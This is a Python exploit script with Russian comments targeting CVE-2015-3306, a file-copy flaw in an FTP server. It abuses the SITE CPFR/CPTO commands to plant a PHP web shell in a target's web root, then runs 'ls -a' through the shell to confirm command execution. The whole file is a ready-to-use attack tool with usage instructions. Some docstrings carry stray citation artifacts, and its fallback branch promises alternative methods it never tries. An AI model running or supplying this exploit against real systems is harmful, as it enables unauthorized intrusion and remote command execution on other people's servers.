#!/usr/bin/env python3
# Рабочий эксплойт для CVE-2015-3306 на основе кода t0kx
# Использование: ./exploit.py <target_ip> <web_path> <filename>

import sys
import socket
import requests
import re

def send_ftp_command(client, command, expected_response=None):
    """Отправляет команду FTP-серверу и проверяет ответ."""
    client.send(command + b'\r\n')
    response = client.recv(1024).decode()
    print(f"[+] Команда: {command.decode().strip()}")
    print(f"[+] Ответ: {response.strip()}")
    
    if expected_response and expected_response not in response:
        return False
    return True

def exploit_t0kx_method(client, web_path, filename):
    """Метод эксплойта от t0kx :cite[1]:cite[6]"""
    try:
        payload = "<?php system($_GET['cmd']); ?>"
        
        # 1. Копируем /proc/self/cmdline в /tmp/ с payload в имени файла
        send_ftp_command(client, b"SITE CPFR /proc/self/cmdline", '350')
        send_ftp_command(client, f"SITE CPTO /tmp/.{payload}".encode('utf-8'), '250')
        
        # 2. Копируем файл с payload в веб-директорию
        send_ftp_command(client, f"SITE CPFR /tmp/.{payload}".encode('utf-8'), '350')
        send_ftp_command(client, f"SITE CPTO {web_path}{filename}".encode('utf-8'), '250')
        
        print(f"[+] PHP-шелл создан в {web_path}{filename}")
        return True
        
    except Exception as e:
        print(f"[-] Ошибка при создании PHP-шелла: {e}")
        return False

def check_web_shell(target, filename):
    """Проверяет, доступен ли PHP-шелл через веб-сервер."""
    url = f'http://{target}/{filename}'
    try:
        response = requests.get(f"{url}?cmd=ls -a", timeout=10)
        if response.status_code == 200:
            print(f'[+] Шелл доступен: {url}')
            print('[+] Вывод команды "ls -a":')
            print(response.text)
            return True
        else:
            print(f'[!] Шелл недоступен (HTTP код: {response.status_code})')
            return False
    except requests.exceptions.RequestException as e:
        print(f'[!] Ошибка при проверке шелла: {e}')
        return False

def main():
    if len(sys.argv) < 4:
        print("Использование: ./exploit.py <целевой IP> <веб-путь> <имя файла>")
        print("Пример: ./exploit.py 192.168.1.10 /var/www/html/ shell.php")
        sys.exit(1)

    target = sys.argv[1]
    web_path = sys.argv[2]
    filename = sys.argv[3]

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(10)

    try:
        client.connect((target, 21))
        banner = client.recv(1024).decode()
        print(f"[+] Баннер сервера: {banner.strip()}")

        # Используем метод t0kx для создания шелла
        if exploit_t0kx_method(client, web_path, filename):
            check_web_shell(target, filename)
        else:
            print("[~] Создание шелла не удалось. Пробуем альтернативные методы...")
            
    except Exception as e:
        print(f"[-] Ошибка: {e}")
    finally:
        client.close()

if __name__ == '__main__':
    main()
